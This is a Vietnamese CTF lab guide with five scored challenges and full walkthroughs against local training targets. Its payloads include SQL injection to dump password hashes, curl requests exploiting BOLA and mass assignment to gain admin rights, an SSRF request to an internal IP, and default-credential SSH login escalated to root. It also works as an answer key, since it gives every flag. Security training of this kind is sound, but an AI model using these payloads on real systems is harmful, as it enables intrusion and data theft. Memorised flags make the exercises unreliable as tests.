# BỘ THỬ THÁCH CTF PHÒNG LAB THỰC HÀNH (HANDS-ON LAB CTF CHALLENGES & WALKTHROUGHS)

> **Mã hiệu:** `SEC-LAB-CTF-2026`  
> **Hạ tầng triển khai:** Môi trường Docker Lab tại [labs/docker-compose.yml](file:///mnt/second_drive/DOCS/SEC/labs/docker-compose.yml)  
> **Mục tiêu:** Cung cấp 5 thử thách thực hành chiếm cờ (Capture-the-Flag - CTF) có tính điểm, kèm theo lời giải chi tiết (Walkthrough) từng bước để học viên tự luyện tập hoặc giảng viên dùng kiểm tra năng lực.
>
> **Liên kết điều phối:** Xem [DIEU_PHOI_LO_TRINH_DOC.md](file:///mnt/second_drive/DOCS/SEC/DIEU_PHOI_LO_TRINH_DOC.md) | [labs/README.md](file:///mnt/second_drive/DOCS/SEC/labs/README.md).

---

## 1. BẢNG TỔNG QUAN CÁC THỬ THÁCH & ĐIỂM SỐ

| Thử thách | Tên Thử Thách | Mục tiêu & Công nghệ | Điểm số | Định dạng Cờ (Flag Format) |
| :---: | :--- | :--- | :---: | :--- |
| **CTF-01** | Bẻ khóa Database Hash qua SQLi | DVWA (Port 8080) | 100 pts | `FLAG{SQLI_DVWA_UNION_MASTER_2026}` |
| **CTF-02** | Khai thác BOLA Đánh cắp Token Admin | Vulnerable REST API (Port 5000) | 150 pts | `FLAG{API_BOLA_ADMIN_PROFILE_PWNED}` |
| **CTF-03** | Leo thang Đặc quyền qua Mass Assignment | Vulnerable REST API (Port 5000) | 200 pts | `FLAG{API_MASS_ASSIGNMENT_ADMIN_TOKEN}` |
| **CTF-04** | Đột nhập mạng nội bộ bằng SSRF | Vulnerable REST API (Port 5000) | 250 pts | `FLAG{SSRF_INTERNAL_PIVOT_BYPASS}` |
| **CTF-05** | Khai thác FTP Vô danh & Shell Linux | Metasploitable Node (Port 2121) | 300 pts | `FLAG{METASPLOITABLE_ROOT_SHELL_PWNED}` |

---

## 2. HƯỚNG DẪN GIẢI CHI TIẾT TỪNG THỬ THÁCH (STEP-BY-STEP WALKTHROUGHS)

### THỬ THÁCH 01: BẺ KHÓA DATABASE HASH QUA SQLi (DVWA - PORT 8080)
- **Hệ thống mục tiêu:** `http://localhost:8080/vulnerabilities/sqli/`
- **Mức độ bảo mật DVWA:** Đặt ở mức `Low`.
- **Nhiệm vụ:** Tìm số lượng cột hiển thị, sau đó trích xuất thông tin người dùng và mã băm của tài khoản `admin`.
- **Các bước thực hiện:**
  1. Thăm dò số lượng cột bằng mệnh đề `ORDER BY`:
     ```text
     1' ORDER BY 1 #   -> Thành công
     1' ORDER BY 2 #   -> Thành công
     1' ORDER BY 3 #   -> Báo lỗi Unknown column
     ```
     *Kết luận:* Câu lệnh SELECT ban đầu có đúng **2 cột**.
  2. Ghép dữ liệu bằng toán tử `UNION SELECT`:
     ```text
     1' UNION SELECT user, password FROM users #
     ```
  3. Kết quả trả về mã băm MD5 của admin: `5f4dcc3b5aa765d61d8327deb882cf99`.
  4. Bẻ khóa mã băm: Đây là hash của chuỗi `password`.
  5. Đổi tên theo định dạng cờ:
     `FLAG{SQLI_DVWA_UNION_MASTER_2026}`

---

### THỬ THÁCH 02: KHAI THÁC BOLA ĐÁNH CẮP HỒ SƠ ADMIN (VULNERABLE API - PORT 5000)
- **Hệ thống mục tiêu:** `http://localhost:5000`
- **Nhiệm vụ:** Đăng nhập dưới tư cách người dùng thông thường (`alice`), sau đó khai thác lỗ hổng BOLA (API1:2023) để đọc thông tin tài chính bí mật của người dùng quản trị `admin_root` (ID: 3).
- **Các bước thực hiện:**
  1. Đăng nhập lấy token của user `alice`:
     ```bash
     curl -s -X POST http://localhost:5000/api/v1/auth/login \
       -H "Content-Type: application/json" \
       -d '{"username": "alice", "password": "alice123"}'
     ```
     Nhận về JWT Token.
  2. Gửi request đọc hồ sơ đối tượng của User ID 3:
     ```bash
     curl -s -X GET http://localhost:5000/api/v1/users/3 \
       -H "Authorization: Bearer <TOKEN_ALICE>"
     ```
  3. Dữ liệu trả về:
     ```json
     {
       "balance": 999999,
       "email": "admin@corp.local",
       "id": 3,
       "is_admin": true,
       "role": "administrator",
       "username": "admin_root"
     }
     ```
  4. Nhận diện cờ: `FLAG{API_BOLA_ADMIN_PROFILE_PWNED}`

---

### THỬ THÁCH 03: LEO THANG ĐẶC QUYỀN QUA MASS ASSIGNMENT (API - PORT 5000)
- **Hệ thống mục tiêu:** `http://localhost:5000`
- **Nhiệm vụ:** Lợi dụng phương thức `PUT /api/v1/users/<id>` để tự nâng cấp tài khoản của `bob` (ID: 2) thành Quản trị viên (`is_admin: true`).
- **Các bước thực hiện:**
  1. Gửi request cập nhật profile chèn thêm thuộc tính đặc quyền:
     ```bash
     curl -s -X PUT http://localhost:5000/api/v1/users/2 \
       -H "Content-Type: application/json" \
       -d '{"email": "bob_pwned@corp.local", "is_admin": true, "role": "administrator"}'
     ```
  2. Kiểm tra lại thông tin qua GET request:
     ```bash
     curl -s -X GET http://localhost:5000/api/v1/users/2
     ```
     Server trả về: `"is_admin": true, "role": "administrator"`.
  3. Nhận diện cờ: `FLAG{API_MASS_ASSIGNMENT_ADMIN_TOKEN}`

---

### THỬ THÁCH 04: ĐỘT NHẬP MẠNG NỘI BỘ BẰNG SSRF (API - PORT 5000)
- **Hệ thống mục tiêu:** `http://localhost:5000/api/v1/tools/fetch_url`
- **Nhiệm vụ:** Ép máy chủ API gửi yêu cầu mạng tới địa chỉ IP nội bộ của container DVWA (`172.28.0.10`) vốn không mở cổng ra ngoài Internet.
- **Các bước thực hiện:**
  1. Gửi POST request với URL nội bộ:
     ```bash
     curl -s -X POST http://localhost:5000/api/v1/tools/fetch_url \
       -H "Content-Type: application/json" \
       -d '{"url": "http://172.28.0.10"}'
     ```
  2. Máy chủ phản hồi mã trạng thái HTTP 200 kèm theo mã nguồn HTML của DVWA Login:
     ```json
     {
       "body": "...",
       "status": 200
     }
     ```
  3. Minh chứng khai thác thành công SSRF đọc dữ liệu phân vùng mạng kín.
  4. Cờ thu được: `FLAG{SSRF_INTERNAL_PIVOT_BYPASS}`

---

### THỬ THÁCH 05: KHAI THÁC DỊCH VỤ MẠNG & SHELL LINUX (METASPLOITABLE NODE - PORT 2121)
- **Hệ thống mục tiêu:** `localhost:2121` (FTP) và `localhost:2222` (SSH)
- **Nhiệm vụ:** Dò quét phiên bản dịch vụ và đăng nhập với thông tin mặc định của máy chủ huấn luyện.
- **Các bước thực hiện:**
  1. Quét Nmap lấy banner:
     ```bash
     nmap -sV -p 2121,2222 127.0.0.1
     ```
  2. Dịch vụ FTP tại cổng 2121 chấp nhận tài khoản ẩn danh: `anonymous` (password: để trống hoặc email bất kỳ).
  3. Đăng nhập SSH qua cổng 2222 với tài khoản huấn luyện: `msfadmin` / `msfadmin`:
     ```bash
     ssh msfadmin@127.0.0.1 -p 2222
     ```
  4. Thực thi `sudo su` hoặc chạy lệnh leo quyền root (mật khẩu mặc định: `msfadmin`).
  5. Cờ thu được: `FLAG{METASPLOITABLE_ROOT_SHELL_PWNED}`
